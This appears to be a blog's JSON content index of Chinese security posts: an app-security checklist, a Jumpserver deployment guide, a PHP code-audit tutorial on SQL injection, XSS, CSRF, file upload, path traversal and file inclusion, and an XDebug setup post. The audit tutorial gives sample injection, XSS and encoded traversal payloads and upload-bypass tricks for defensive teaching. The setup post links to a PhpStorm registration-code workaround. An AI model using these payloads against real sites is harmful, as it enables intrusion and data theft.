11.1 登录认证 重要系统是否使用了双因素登录认证，例如：数字证书，支付盾，密保卡等，防止用户密码泄露导致系统被非法登录 重要系统是否使用了安全控件，对用户提交的关键数据进行加密 重要系统的后台管理界面是否限制了访问源地址 系统的密码重置等短信发送等功能的使用频率是否进行了限制，例如：一个手机号一分钟只能发送一条短信，防止被恶意利用多次发送短信 用户登录时的用户名，状态，源地址等关键信息需要记录到应用日志中，管理员可以进行查询 如果用户在不常用的地址登录，系统会提示用户，并显示上一次登录的源地址 对于多次密码错误的登录尝试，系统能否检测，禁止源地址访问10分钟，管理员登录后可以看到，也可以进行查询 11.2 数据操作 系统中大数据量查询等影响系统负载的功能是否进行了查询范围限制，例如：只能查询最近3个月的数据 系统中大数据量查询等影响系统负载的功能是否进行了查询频率限制，例如：一分钟内只能查询一次 高可用性要求的系统中是否有用户请求频率检测，超过访问阈值时，需要用户输入页面上的图形验证码，才能进一步操作 对报表查询等涉及大量数据的读取和导出操作，是否严格限制了查询范围，必要时可以使用双用户认证，限制单个用户大量读取业务数据的能力 业务关键数据的读取页面，是否使用静态密码、手机动态密码等二次验证，防止敏感数据泄露，例如：交易详单的查询 业务处理过程中用户身份等关键识别信息，是否保存在服务端，禁止从客户端提交 业务处理过程中关键操作需要用户确认和图形验证码，手机动态验证码等保护，防止重放攻击，例如：转账操作等 关键业务操作需要记录到应用日志中，可以设置阈值，超过系统会告警，管理员可以进行查询。例如：转账金额大于20万的交易记录 涉及资金的业务用户可以设置上限，例如：用户可以设置每日最高消费限额，并在转账 关键业务操作可以设置短信提醒，例如：用户进行资金转账，进行详单查询等 文章转载于：http://blog.nsfocus.net/code-audit-instruction/","categories":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/categories/代码审计/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/代码审计/"},{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"}]},{"title":"Jumpserver的部署和基本使用","slug":"Jumpserver的部署和基本使用","date":"2018-08-13T13:25:05.000Z","updated":"2018-08-13T14:41:00.624Z","comments":true,"path":"2018/08/13/Jumpserver的部署和基本使用/","link":"","permalink":"http://yoursite.com/2018/08/13/Jumpserver的部署和基本使用/","excerpt":"【前言】 Jumpserver 是全球首款完全开源的堡垒机，使用 GNU GPL v2.0 开源协议，是符合 4A 的专业运维审计系统。Jumpserver 使用 Python / Django 进行开发，遵循 Web 2.0 规范，配备了业界领先的 Web Terminal 解决方案，交互界面美观、用户体验好。","text":"【前言】 Jumpserver 是全球首款完全开源的堡垒机，使用 GNU GPL v2.0 开源协议，是符合 4A 的专业运维审计系统。Jumpserver 使用 Python / Django 进行开发，遵循 Web 2.0 规范，配备了业界领先的 Web Terminal 解决方案，交互界面美观、用户体验好。 0x01 【安装环境】CentOS Linux release 7.5.1804 (Core) 0x02 【准备】本次是使用docker安装jumpserver，所以要先在CentOS 7环境下安装Docker。 12345yum update -yyum -y install dockersystemctl start docker 验证安装1docker version 配置Docker设置镜像1234567vim /etc/docker/daemon.json\\&gt;&#123; &quot;registry-mirrors&quot;: [&quot;https://aj2rgad5.mirror.aliyuncs.com&quot;]&#125; 重启Docker123systemctl daemon-reloadsystemctl restart docker.service 0x03 【安装步骤】Docker快速启动使用 root 命令行输入:1docker run -d -p 8080:80 -p 2222:2222 registry.jumpserver.org/public/jumpserver:1.0.0 访问 浏览器访问: http://&lt;容器所在服务器IP&gt;:8080 SSH访问: ssh -p 2222 &lt;容器所在服务器IP&gt; XShell等工具请添加connection连接 额外环境变量 DB_ENGINE = mysql DB_HOST = mysql_host DB_PORT = 3306 DB_USER = xxx DB_PASSWORD = xxxx DB_NAME = jumpserver REDIS_HOST = REDIS_PORT = REDIS_PASSWORD = &lt;1docker run -d -p 8080:80 -p 2222:2222 -e DB_ENGINE=mysql -e DB_HOST=192.168.1.1 -e DB_PORT=3306 -e DB_USER=root -e DB_PASSWORD=xxx -e DB_NAME=jumpserver registry.jumpserver.org/public/jumpserver:1.0.0 以上是实现在Docker下的安装，不过不建议在生产中使用, 因为所有软件都打包到一个Docker中了，不是Docker最佳实践。 在CentOS中安装请参考：http://docs.jumpserver.org/zh/docs/dockerinstall.html 0x04 【快速入门】架构说明 组件说明jumpserver 现指jumpserver管理后台，是核心组件（Core），使用Django Class BasedV 风格开发，支持Restful API COCO 实现SSH Server和Web Terver的组件，提供SSH和WebSocket接口，使用Paramiko和Flask开发。 Luna 现在是 Web Terminal 前端，计划前端页面都由该项目提供，Jumpserver 只提供 API，不再负责后台渲染html等。 Guacamole Apache 跳板机项目，Jumpserver 使用其组件实现 RDP 功能，Jumpserver 并没有修改其代码而是添加了额外的插件，支持 Jumpserver 调用。 基本设置 修改 URL 的 localhost 为你的实际 url 地址，否则邮件收到的地址将为 localhost 修改完 url 地址后需要重启 jumpserver 服务（重启才能生效，后续会解决这个问题） 创建管理用户 # 如果使用ssh私钥管理资产，需要先在资产上设置，这里举个例子供参考（本例登录资产使用root为例） (1). 在资产上生成 root 账户的公钥和私钥 $ ssh-keygen -t rsa # 默认会输入公钥和私钥文件到 ~/.ssh 目录 连续三次回车后。生成了本机的私钥和公钥 (2). 将公钥输出到文件 authorized_keys 文件，并修改权限 $ cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys $ chmod 400 ~/.ssh/authorized_keys (3). 打开RSA验证相关设置 $ vim /etc/ssh/sshd_config RSAAuthentication yes PubkeyAuthentication yes AuthorizedKeysFile .ssh/authorized_keys (4). 重启 ssh 服务 $ service sshd restart (5). 上传 ~/.ssh 目录下的 id_rsa 私钥到 jumpserver 的管理用户中 sz id_rsa #下载私钥到本地，再上传到jumpserver中 # 这样就可以使用 ssh私钥 进行管理服务器 # 名称可以按资产树来命名。用户名root。密码和 SSH 私钥必填一个 创建资产 # 点击页面左侧的“资产管理”菜单下的“资产列表”按钮，查看当前所有的资产列表。 # 点击页面左上角的“创建资产”按钮，进入资产创建页面，填写资产信息。 # IP 地址和管理用户要确保正确，确保所选的管理用户的用户名和密码能”牢靠”地登录指定的 IP 主机上。 资产的系统平台也务必正确填写。公网 IP 信息只用于展示，可不填，Jumpserver 连接资产使用的是 IP 信息。 创建Windows系统用户 # 目前 Windows 暂不支持自动推送，用户必须在系统中存在且有权限使用远程连接，请确认资产的防火墙已经开放 注：Windows 资产协议务必选择 rdp # 如果想让用户登录资产时自己输入密码，可以点击系统用户的名称 点击清除认证信息 创建Widoows资产 # 同创建 Linux 资产一样。 # 创建 Windows 资产，系统平台请选择正确的 Windows，默认 RDP 端口号为3389，IP 和 管理用户请正确选择， 注：确保管理用户能正确登录到指定的 IP 主机上 Windwos资产连接说明：http://docs.jumpserver.org/zh/docs/faq_windows.html Web终端 Web 终端是资产使用界面，管理员和用户都是从这里登录到资产上，执行操作。点击资产名字连接资产，点击”Server”下的”Disconnect”断开资产连接。 历史会话 历史会话同在线会话包含的信息一样，都有用户、资产和 IP 地址等信息。Jumpserver 提供历史会话的录像观看。点击左侧的”回放”按钮，即可观看录像。 更多文档参考：http://docs.jumpserver.org/zh/docs/admin_guide.html 安装问题：http://docs.jumpserver.org/zh/docs/faq_install.html","categories":[{"name":"安全运维","slug":"安全运维","permalink":"http://yoursite.com/categories/安全运维/"}],"tags":[{"name":"服务部署","slug":"服务部署","permalink":"http://yoursite.com/tags/服务部署/"}]},{"title":"Web 安全 代码审查之常规漏洞","slug":"Web-安全-PHP-代码审查之常规漏洞","date":"2018-08-12T14:39:00.000Z","updated":"2018-08-14T08:01:25.343Z","comments":true,"path":"2018/08/12/Web-安全-PHP-代码审查之常规漏洞/","link":"","permalink":"http://yoursite.com/2018/08/12/Web-安全-PHP-代码审查之常规漏洞/","excerpt":"0x01 前言 工欲善其事，必先利其器。我们做代码审计之前选好工具也是十分必要的。下面我给大家介绍两款代码审计中比较好用的工具。","text":"0x01 前言 工欲善其事，必先利其器。我们做代码审计之前选好工具也是十分必要的。下面我给大家介绍两款代码审计中比较好用的工具。 什么是源代码审查？检查源代码中的缺点和错误信息，分析并找到这些问题引发的安全漏洞，并提供代码修订措施和建议;是一种以发现程序错误，安全漏洞和违反程序规范，为目标的源代码分析 MVC设计模型： Struts简介：Struts是Apache软件基金下一个项目。Struts有一组相互协作的类（组件）、Servlet以及jsp tag lib组成。基于struts构架的web应用程序基本上符合JSP Model2的设计标准，可以说是MVC设计模式的一种变化类型。 根据上面对framework的描述，很容易理解为什么说Struts是一个web framework，而不仅仅是一些标记库的组合。 但 Struts 也包含了丰富的标记库和独立于该框架工作的实用程序类。Struts有其自己的控制器（Controller），同时整合了其他的一些技术去实现模型层（Model）和视图层（View）。在模型层，Struts可以很容易的与数据访问技术相结合，包括EJB，JDBC和Object Relation Bridge。在视图层，Struts能够与JSP, Velocity Templates,XSL等等这些表示层组件相结合 ZF框架： Zend Framework(简写ZF)是由 Zend 公司支持开发的完全基于 PHP5 的开源PHP开发框架，可用于开发 Web 程序和服务，ZF采用 MVC(Model–View-Controller) 架构模式来分离应用程序中不同的部分方便程序的开发和维护。 代码审计的方式通读原文：函数集文件、配置文件、安全过滤文件、index文件程序结构：浏览源码文件夹，了解程序的大致目录入口文件：web.xml、struts-xx.xml、spring-xxx.xml文件一般是整个程序的入口，从中可知道：程序的架构、运行流程、包含哪些配置文件、包含哪些过滤文件和安全过滤文件、了解程序的业务逻辑配置文件：一般类似config.properties 等文件，保存一些数据库相关信息、程序的一些信息。先看数据库编码，如果是gbk可能存在宽字节注入。若变量的值用双引号、则可能存在双引号解析代码执行的问题过滤功能：通过详读公共函数文件和安全过滤文件等文件，清晰掌握：用户输入的数据，哪些被过滤，哪些无过滤如何过滤。在哪里被过滤了？如何过滤，过滤的方式是替换还是正则，有没有GPC，有没有使用 addslasher()处理？能否绕过过滤的数据。 0x02 代码审计工具1：Fortify SCAFortify SCA 是一个静态的、白盒的软件源代码安全测试工具。它通过内置的五大主要分析引擎：数据流、语义、结构、控制流、配置流等对应用软件的源代码进行静态的分析，分析的过程中与它特有的软件安全漏洞规则集进行全面地匹配、查找，从而将源代码中存在的安全漏洞扫描出来，并给予整理报告。扫描的结果中不但包括详细的安全漏洞的信息，还会有相关的安全知识的说明，以及修复意见的提供。 工作原理Foritfy SCA 首先通过调用语言的编译器或者解释器把前端的语言代码（如JAVA，C/C++源代码）转换成一种中间媒体文件NST（Normal Syntax Tree）将其源代码之间的调用关系，执行环境，上下文等分析清楚。然后再通过上述的五大分析引擎从五个切面来分析这个NST，匹配所有规则库中的漏洞特征，一旦发现漏洞就抓取出来。最后形成包含详细漏洞信息的FPR结果文件，用AWB打开查看。 扫描结果：Fortify SCA 的结果文件为.FPR文件，包括详细的漏洞信息：漏洞分类，漏洞产生的全路径，漏洞所在的源代码行，漏洞的详细说明及修复建议等目前Fortify SCA可以扫描出约350种漏洞，Fortify将所有安全漏洞整理分类，根据开发语言分项目，再细分为8个大类，约350个子类 0x03 代码审计工具2：Seay源代码审计工具功能介绍这些是seay 第一个版本的部分功能，现在最新版本是2.1、傻瓜化的自动审计、支持php代码调试、函数/变量定位、生成审计报告、自定义审计规则、mysql数据库管理、黑盒敏感信息泄露一键审计、支持正则匹配调试 、编辑保存文件、POST数据包提交 。安装方法安装环境需要 .NET2.0以上版本环境才能运行，下载安装包之后点击下一步就安装好了，非常的简便。安装包下载地址：http://enkj.jb51.net:81/201408/tools/Seayydmsjxt(jb51.net).rar 0x04 代码审计工具3：RIPS文献参考：https://mp.weixin.qq.com/s/W4ZgCEmjkSAexXBTVBD_zg功能介绍RIPS 是一款基于 PHP 开发的针对 PHP 代码安全审计的软件。另外，它也是一款开源软件，由国外安全研究员 Johannes Dahse 开发，程序只有 450KB，目前能下载到的最新版是0.55。在写这段文字之前笔者特意读过它的源码，它最大的亮点在于调用了 PHP 内置解析器接口token_get_all，并且使用Parser做了语法分析，实现了跨文件的变量及函数追踪，扫描结果中非常直观地展示了漏洞形成及变量传递过程，误报率非常低。RIPS 能够发现 SQL 注入、XSS 跨站、文件包含、代码执行、文件读取等多种漏洞，支持多种样式的代码高亮。比较有意思的是，它还支持自动生成漏洞利用。 安装方法下载地址：https://jaist.dl.sourceforge.net/project/rips-scanner/rips-0.55.zip.解压到任意一个PHP的运行目录在浏览器输入对应网址，可以通过下图看到有一个path 在里面填写你要分析的项目文件路径，点击 scan. 0x05 代码审计实战通过刚才安装的两个审计工具运行后我们可以发现，会分析出很多隐藏的漏洞，那下面我们看看其中的SQL注入、XSS、CSRF产生的原因,通过原因来分析如何去审计代码。 SQL Injection （SQL 注入攻击）SQL注入攻击（SQL Injection），简称注入攻击、SQL注入，被广泛用于非法获取网站控制权，是发生在应用程序的数据库层上的安全漏洞。在设计程序，忽略了对输入字符串中夹带的SQL指令的检查，被数据库误认为是正常的SQL指令而运行，从而使数据库受到攻击，可能导致数据被窃取、更改、删除，以及进一步导致网站被嵌入恶意代码、被植入后门程序等危害。 SQL注入产生的原因程序开发过程中不注意规范书写sql语句和对特殊字符进行过滤，导致客户端可以通过全局变量POST和GET提交一些sql语句正常执行 编码注入方式宽字节注入，这个是怎么回事呢？在实际环境中程序员一般不会写上面类似的代码，一般都会用addslashes()等过滤函数对从web传递过来的参数进行过滤。不过有句话叫做，道高一尺魔高一丈，我们看看白帽子是怎么突破的。用PHP连接MySQL的时候，当设置 character_set_client=gbk时候会导致一个编码漏洞。我们知道addslashes() 会把参数 1’ 转换成 1\\’,而我们提交参数 1%df’ 时候会转成 1縗’，那我们输入 1%df’ or 1=1%23时候，会被转换成 1縗’ or 1=1#’。简单来说%df’会被过滤函数转义为%df\\’ ，%df\\’ = %df%5c%27 在使用gbk编码的时候会认为%df%5c是一个宽字节%df%5c%27=縗’，这样就会产生注入。那如何防御这个宽字节呢？我希望大家开发网站尽量使用UTF8编码格式，如果转换麻烦，最安全的方法就是使用PDO预处理。挖掘这种漏洞主要是检查是否使用了gbk，搜索guanjianc character_set_client=gbk 和mysql_set_chatset(‘gbk’) 。二次urldecode注入，这中方式也是因为使用了urldecode不当所引起的漏洞。我们刚才知道了 addslashes()函数可以防止注入，他会在(‘)、(“)、()前面加上反斜杠来转义。那我们假设我们开启了GPC，我们提交了一个参数，/test.php?uid=1%2527,因为参数中没有单引号，所以第一次解码会变成uid=1%27,%25解码出来就是%，这时候程序里如果再去使用urldecode来解码，就会把%27解码成单引号(‘)，最终的结果就是uid=1’.我们现在知道了原有是因为urldecode引起的，我们可以通过编辑器的搜索urldecode和rawurldecode找到二次url漏洞。 从漏洞类型区分可以分为三种类型可显：攻击者可以直接在当前界面内容中获取想要获得的内容。报错：数据库查询返回结果并没有在页面中显示，但是应用程序将数据库报错信息打印到了页面中。所以攻击者可以构造数据库报错语句，从报错信息中获取想要获得的内容，所以我建议在数据库类中设置不抛出错误信息。盲注：数据库查询结果无法从直观页面中获取攻击者通过使用数据库逻辑或使数据库库执行延时等方法获取想要获得的内容。 SQL 注入漏洞挖掘方法针对上面提到的利用漏洞方法，总结了以下的挖掘方法：参数接收位置，检查是否有没过滤直接使用 _POST、$_COOKIE 参数的。SQL语句检查，搜索关键词 select update insert 等SQL语句关键处，检查SQL语句的参数是否可以被控制。宽字节注入,如果网站使用的 GBK 编码情况下，搜索guanjianc character_set_client=gbk 和mysql_set_chatset(‘gbk’) 就行。二次 urldecode 注入，少部分情况，gpc 可以通过编辑器的搜索 urldecode 和 rawurldecode 找到二次url漏洞。 SQL 注入漏洞防范方法虽然SQL注入漏洞非常多，但是防范起来却挺简单的，下面介绍几个过滤函数和类:gpc/rutime 魔术引号过滤函数和类addslashesmysql_real_escape_stringintvalPDO 预处理 SQL注入过程 攻击者访问登录页面 输入用户名及密码 将含有攻击字符串组成SQL语句转发给数据库执行 数据库执行发回应用程序服务器 应用程序将内容返回浏览器，即绕过成功 XSS（Cross-Site Scripting）跨站脚本攻击（Cross Site Scripting）是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。为了与层叠样式表Cascading Style Sheets）的缩写CSS区分开，跨站脚本攻击通常简写为XSS。XSS 属于被动式的攻击，因为其被动且不好利用，所以许多人常呼略其危害性。在 WEB2.0 时代，强调的是互动，使得用户输入信息的机会大增，在这个情况下，我们作为开发者，在开发的时候，要提高警惕。 xss 漏洞分类1.反射型，危害小，一般反射型XSS原理：就是通过给别人发送带有恶意脚本代码参数的URL，当URL地址被打开时，特定的代码参数会被HTML解析，执行，如此就可以获取用户的COOIKE，进而盗号登陆。比如hack甲构造好修改密码的URL并把密码修改成123，但是修改密码只有在登陆方乙才能修改，乙在登陆的情况下点击甲构造好的URL将直接在不知情的情况下修改密码。特点是：非持久化，必须用户点击带有特定参数的链接才能引起。反射型XSS是比较普遍的XSS，其危害程度通常被认为较小。但是某些反射型XSS造成的后果会很严重，如在输入框的name中输入，服务器不加处理，将name的值直接送到浏览器，则浏览器会每5秒自动刷新一次。严重者会导致服务器崩溃。 2.存储型，危害大，影响时间长存储型XSS原理，假设你打开了一篇正常的文章页面，下面有评论功能。这个时候你去评论了一下，在文本框中输入了一些JavaScript代码，提交之后,你刷新这个页面后发现刚刚提交的代码又被原封不动的返回来并且执行了。这个时候你会想,我要写一段 JavaScript 代码获取 cookie 信息，然后通过ajax发送到自己的服务器去。构造好代码后你把链接发给其他的朋友，或者网站的管理员，他们打开 JavaScript 代码就执行了，你服务器就接收到了sessionid，你就可以拿到他的用户权限了。 3.dom型，特殊的一种dom型 XSS 是因为 JavaScript 执行了dom 操作，所造成的 XSS 漏洞，具体如下图。可以看到虽然经过 html 转义了，但是这块代码在返回到 html 中，又被 JavaScript 作为 dom 元素操作。那当我输入如下代码的时候依然会存在 XSS 漏洞。1name=&lt;img src=1 onerror=alert(1)&gt; 漏洞思路：搜索内容、发表文章、留言、评论回复 xss 漏洞挖掘方法根据上面的一些特点，可以总结出几个分析出几个挖掘方法：数据接收位置，检查 _POST、$_COOKIE是否经过转义。常见的反射型XSS搜索这种类似位置发现次数较多。而存储型在文章，评论出现比较多。 XSS 漏洞防范方法1.转义html实体，有两种方式：在入口和出口,我建议是在入口处转义，防止出口位置取出来的时候忘记转义，如果已经在入口转义了，出口位置就不用再次转义。2.在富文本编辑器中，经常会用到一些元素的属性，比如上图的onerror，那我们还需对元素的属性建立黑白名单。3httpOnly 即使存在xss漏洞，可以把危害大大降低。4.对所有输入中的script、iframe等字样进行严格的检查5.验证数据的类型及其格式、长度、范围和内容6.客户端做数据的验证与过滤，关键的过滤步骤在服务端进行检查7.入参和出参校验(1)“&lt; &gt;” 可以引入一个标签或者结束一个标签。(2) “&amp;” 可以引入一个字符实体。(3)对于外加双引号的属性值，双引号(””)是特殊字符，因为它们标记了该属性值的结束。(4) 对于外加单引号的属性值，单引号(‘’)是特殊字符，因为它们标记了该属性值的结束8.URL重定向校验（1）空格符、制表符和换行符标记了 URL 的结束。（2） “&amp;” 引入一个字符实体（3）非 ASCII 字符（即 ISO-8859-1 编码表中所有高于 128 的字符）不允许出现在 URL 中，因此在此上下文中也被视为特殊字符。（4）在服务器端对在 HTTP 转义序列中编码的参数进行解码时，必须过滤掉输入中的 “%” 符号。 CSRF（跨站请求伪造）CSRF 漏洞介绍CSRF（Cross-site request forgery）跨站请求伪造，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。听起来像跨站脚本（XSS），但它与XSS非常不同，XSS利用站点内的信任用户。而 CSRF 则通过伪装来自受信任用户的请求来利用受信任的网站。与 XSS 攻击相比，CSRF 攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。csrf 主要用来做越权操作，而且 csrf 一直没有被关注起来，所以很多程序现在也没有相关的防范措施。 漏洞危害攻击者盗用了你的身份信息，以你的名义发送恶意请求。以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账等造成的问题包括：个人隐私泄露以及财产安全。 CSRF 案例我们来看下面的一段代码,这个表单当被访问到的时候，用户就退出了登录。假设有一个转账的表单，只需要填写对方的用户名，和金额就可以，那如果我提前把 URL 构造好，发给受害者，当点击后，钱就被转走了。或者我把这个 URL 放到我的网页中，通过&lt;img src=”我构造的URL” ，当其他人打开我的网址后，就中招了。 攻击流程 CSRF漏洞挖掘方法通过上面的描述，我们知道了漏洞的原有，那我们审计的时候可以检查处理表单有没有以下判断。是否有验证 token。是否有图片验证码。是否有 refe 信息。如果三个判断都没有，那么就存在了 CSRF 漏洞，CSRF 不仅限于 GET 请求， POST 请求同样存在。CSRF 漏洞防范方法图片验证码，这个想必大家都知道，但是用户体验并不好，我们可以看下面的一些处理方法。token验证。token验证方法如下，每次访问表单页的时候，生成一个不可预测的token存放在服务器session中，另外一份放页面中，提交表单的时候需要把这个token带过去，接收表单的时候先验证一下token是否合法。Referer信息验证大多数情况下，浏览器访问一个地址，其中header头里面会包含Referer信息,里面存储了请求是从哪里发起的。如果HTTP头里包含有Referer的时候，我们可以区分请求是同域下还是跨站发起的，所以我们也可以通过判断有问题的请求是否是同域下发起的来防御 CSRF 攻击。Referer 验证的时候有几点需要注意，如果判断Referer是否包含 *.XXX.com,如果有子域名有漏洞，会存在绕过的可能。如果判断的条件的是Referer中是否包含字符 ‘xxx.com’ 那攻击者在他目录中建立一个 xxx.com 文件夹同样存在绕过的可能。如果可以最合适的判断是，直接判断是否等于当前域名。 文件上传漏洞文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，“文件上传”本身是没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。 漏洞危害上传文件的时候，服务器端脚本语言未对上传的文件进行严格的验证和过滤，就有可能上传恶意的文件，从而控制整个网站，甚至是服务器。 漏洞条件文件可以上传、知道文件上传的路径、上传文件可以被访问、上传文件可以被执行 文件上传可控点Content-Length,即上传内容大小MAX_FILE_SIZE,即上传内容的最大长度filename,即上传文件名Content-Type,即上传文件类型请求包中的乱码字段，即是所上传文件的内容有可能存在请求包中的可控点还有上传路径，只是上面的示例中没有出现 挖掘思路上传点都调用同一个上传类，直接全局搜索上传函数黑盒寻找上传点，代码定位 代码案例name：客户端的原始上传文件名称Type：上传文件的MIME类型Tmp_name：服务器端用来保存上传文件的临时文件路径Error：上传文件时的错误信息Size：上传文件的大小，单位 文件上传绕过客户端用firebug将form表单中的onsubmit事件删除上传木马文件，Burp拦截数据包，修改扩展名 文件上传绕过服务端黑白名单过滤修改MIME类型截断上传攻击.htaccess文件攻击目录验证 防护方案检测文件上传内容黑白名单验证，检测文件扩展名是否合法MIME验证，检测文件的MIME类型限制文件大小更改临时文件夹的路径读取上传文件的绝对路径与文件名称隐藏文件路面 文件操作漏洞 目录穿越目录穿越(Directory Traversal)攻击是黑客能够在Web应用程序所在的根目录以外的文件夹上，任意地存取被限制的文件夹、执行命令或查找数据。目录穿越攻击，也有人称为Path Traversal攻击。 漏洞危害攻击者可以使用目录穿越攻击来查找、执行或存取Web应用程序所在的根目录以外的文件夹。如果目录穿越攻击成功，黑客就可以执行破坏性的命令来攻击网站。 绕过方式进行URL编码点–&gt;%2e 反斜杠–&gt;%2f 正斜杠–&gt;%5c 进行16为Unicode编码点–&gt;%u002e 反斜杠–&gt;%u2215 正斜杠–&gt;%u2216 进行双倍URL编码点–&gt;%252e 反斜杠–&gt;%u252f 正斜杠–&gt;%u255c 进行超长UTF-8 Unicode编码点–&gt;%c0%2e %e0$40%ae %c0ae 反斜杠–&gt;%c0af %e0%80af %c0%af 正斜杠–&gt;%c0%5c %c0%80%5c 修复方案在URL内不要使用文件名称作为参数检查使用者输入的文件名是否有“..”的目录阶层字符在php.ini文件中设置open_basedir来指定文件的目录使用realpath函数来展开文件路径中的“./”、 “../”等字符，然后返回绝对路径名称使用basename函数来返回不包含路径的文件名称 文件包含漏洞文件包含漏洞的产生原因是在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就形成的本地文件包含漏洞，被包涵的文件在第三方服务是，就形成了远程文件包含漏洞。 漏洞危害执行恶意代码包含恶意文件控制网站甚至控制网站服务器等 本地包含本地文件包含（Local File Include，LFI），LFI允许攻击者通过浏览器包含本机上的文件。当一个WEB应用程序在没有正确过滤输入数据的情况下，就有可能存在这个漏洞，该漏洞允许攻击者操纵输入数据、注入路径遍历字符、包含web服务器的其他文件。 远程包含远程文件包含（Remote File Include，RFI）， RFI允许攻击者包含远程文件，远程文件包含需要设置allow_url_include = On，四个文件都支持HTTP、FTP等协议，相对本地文件包含更容易利用，出现的频率没有本地包含多。 挖掘经验模块加载、cache调用，传入的参数拼接包含路径include()使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。 inclue_once()功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。 require()使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。 require_once()功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。 修复方案关闭远程包含参数开关，彻底切断这个业务相比较设置类似白 名单的方法，筛选固定文件名常见目录穿越字符进行过滤，如（./ .// ..\\等） 任意文件读取漏洞通过提交专门设计的输入，攻击者就可以在被访问的文件系统中读取或写入任意内容，往往能够使攻击者从服务器上获取敏感信息文件，正常读取的文件没有经过校验或者不严格，用户可以控制这个变量读取任意文件 漏洞危害任意文件读取漏洞，是web安全里高危的漏洞，它可以泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。 挖掘经验fopen()file_get_contents()freadfgets allow_url_fopen选项激活了 URL 形式的 fopen 封装协议fgetss 使得可以访问 URL 对象例如文件。默认的封装协议提供用ftp 和 http 协议来访问远程文件，一些扩展库例如 zlib 可file 能会注册更多的封装协议 任意文件删除攻击者从寻找上删除的功能，正常删除功能的文件没有经过校验或者不严格，攻击者控制这个可操作的变量配合目录遍历进行删除其他文件 unlink函数 修复方案正则严格判断用户参数的格式检查使用者输入的文件名是否有 “..” 的目录阶层字符在php.ini文件中设置open_basedir来限定文件访问范围 0x06 常规漏洞的防范方法taint PHP 安全扩展功能介绍Taint 可以用来检测隐藏的 XSS code, SQL 注入， Shell注入等漏洞，并且这些漏洞如果要用静态分析工具去排查， 将会非常困难， 我们来看下面这张图:安装方法下载 taint： http://pecl.php.net/package/taint 配置123/usr/local/php/bin/phpize./configure --with-php-config=/usr/local/php/bin/php-configmake &amp;&amp; make install 更加详细的可以参考：http://www.cnblogs.com/linzhenjie/p/5485474.html应用场景开发团队要求每个人都做到非常的安全比较难，但是把taint安装在开发环境，特别适合，一看到 warning 信息一般都回去改。 ngx_lua_waf功能介绍防止 sql 注入，本地包含，部分溢出，fuzzing 测试，xss，SSRF 等 web攻击。防止 svn /备份之类文件泄漏。防止 ApacheBench 之类压力测试工具的攻击。屏蔽常见的扫描黑客工具，扫描器。屏蔽异常的网络请求。屏蔽图片附件类目录 php 执行权限。防止 webshell 上传。安装方法安装依赖: luajit 、ngx_devel_kit、nginx_lua_module安装nginx、ngx_lua_waf在nginx.conf里的 http 添加配置详细安装文档效果图 0x07 参考文献https://mp.weixin.qq.com/s/W4ZgCEmjkSAexXBTVBD_zghttp://www.cnblogs.com/linzhenjie/p/5485474.html","categories":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/categories/代码审计/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://yoursite.com/tags/PHP/"},{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/代码审计/"}]},{"title":"Phpstorm+phpstudy+xdebug+Dolibarr","slug":"Phpstorm-phpstudy-xdebug-Dolibarr","date":"2018-08-11T15:20:00.000Z","updated":"2018-08-11T15:46:28.358Z","comments":true,"path":"2018/08/11/Phpstorm-phpstudy-xdebug-Dolibarr/","link":"","permalink":"http://yoursite.com/2018/08/11/Phpstorm-phpstudy-xdebug-Dolibarr/","excerpt":"【前言】 PhpStorm 是 JetBrains 公司开发的一款商业的 PHP 集成开发工具，旨在提高用户效率，可深刻理解用户的编码，提供智能代码补全，快速导航以及即时错误检查。phpStudy是一个PHP调试环境的程序集成包。该程序包集成最新的Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer,一次性安装，无须配置即可使用，是非常方便、好用的PHP调试环境·该程序不仅包括PHP调试环境，还包括了开发工具、开发手册等·总之学习PHP只需一个包。","text":"【前言】 PhpStorm 是 JetBrains 公司开发的一款商业的 PHP 集成开发工具，旨在提高用户效率，可深刻理解用户的编码，提供智能代码补全，快速导航以及即时错误检查。phpStudy是一个PHP调试环境的程序集成包。该程序包集成最新的Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer,一次性安装，无须配置即可使用，是非常方便、好用的PHP调试环境·该程序不仅包括PHP调试环境，还包括了开发工具、开发手册等·总之学习PHP只需一个包。 【准备】先从网上下载PhpStorm和Phpstudy软件，版本不限定。在第一次打开Phpstorm时，需要输入注册码，具体方法可参考https://blog.csdn.net/finish_dream/article/details/80045514 亲测有效。 【配置步骤】进行phpStudy+PhpStorm+XDebug的配置，因为phpStudy集成了XDebug扩展，所以不用单独下载XDebug。 1.phpStudy当前版本确定，我们用PHP-5.5.38的版本。 2.在其他选项菜单-&gt;打开配置文件-&gt;php.ini，滑到最后看到[XDebug]节点做如下的修改： 